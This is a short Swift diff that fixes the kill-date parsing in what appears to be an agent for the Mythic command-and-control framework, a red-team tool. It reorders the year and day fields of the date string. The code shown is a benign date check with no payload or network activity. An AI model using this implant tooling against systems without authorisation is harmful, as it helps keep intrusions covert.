@@ -95,9 +95,9 @@ func checkKillDate() {
     
     // Get kill date from Mythic
     let killDate = (agentConfig.killDate).components(separatedBy: "-")
-    let killDay = Int(killDate[0])!
+    let killDay = Int(killDate[2])!
     let killMonth = Int(killDate[1])!
-    let killYear = Int(killDate[2])!
+    let killYear = Int(killDate[0])!
     
     // If current year is larger, exit
     if (killYear < dateTimeComponents.year!) {
